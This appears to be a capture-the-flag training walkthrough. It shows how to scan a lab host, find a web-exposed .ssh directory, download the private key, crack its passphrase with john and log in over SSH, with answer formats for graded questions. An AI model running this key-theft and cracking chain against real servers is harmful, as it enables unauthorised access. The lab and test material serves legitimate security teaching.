# Scenario 18 — SSH key leak via exposed .ssh directory

**Difficulty:** 🟡 | **Time:** ~20 min | **Domains:** 02, 13, 14
**Tools:** [nmap](../../tools/nmap.md), [gobuster](../../tools/gobuster.md), [john](../../tools/john.md)

## Story
You're given target 10.10.10.18. A web server leaks a user's `.ssh` directory. Use the key to log in as that user and read `~/user.txt`.

## Step 1 — Port/service scan
```bash
nmap -sV -p- 10.10.10.18
```
**Expected finding:** 22/ssh, 80/http.
**→ Tool ref:** [nmap](../../tools/nmap.md#port-specification)

## Step 2 — Web content discovery
**What we're doing:** Look for a `backup/`, `home/`, or user directory that's been indexed.
```bash
gobuster dir -u http://10.10.10.18/ -w /usr/share/wordlists/dirb/common.txt -x html,txt
```
**Expected finding:** `/backup/` or `/.ssh/` returning 200/301.
**→ Tool ref:** [gobuster dir](../../tools/gobuster.md#dir-mode)

## Step 3 — Grab id_rsa
```bash
curl -s http://10.10.10.18/backup/.ssh/id_rsa -o id_rsa
curl -s http://10.10.10.18/backup/.ssh/id_rsa.pub
chmod 600 id_rsa
```
**Expected finding:** Private key; `.pub` reveals username via `user@hostname`.

## Step 4 — Crack the passphrase if encrypted
**What we're doing:** Convert to john format and dictionary-attack.
```bash
ssh2john id_rsa > id_rsa.john
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john
```
**Expected finding:** passphrase recovered.
**→ Tool ref:** [john formats](../../tools/john.md#format-list)

## Step 5 — SSH in
```bash
ssh -i id_rsa user@10.10.10.18
cat ~/user.txt
```

## Step 6 — Final answer
**Answer format:** contents of `user.txt`.

## Gotchas across this chain
- Key file must be `chmod 600` or ssh refuses it with "UNPROTECTED PRIVATE KEY FILE".
- If `id_rsa` is not encrypted, `ssh2john` emits `No hashes loaded` — just skip Step 4.
- Username is usually in `authorized_keys` trailing comment (`user@host`) — that's the SSH login name.

## Variant questions this scenario teaches
- "What is the SSH key passphrase?"
- "What username owns the leaked key?"
- "What is the key fingerprint?" → `ssh-keygen -lf id_rsa.pub`

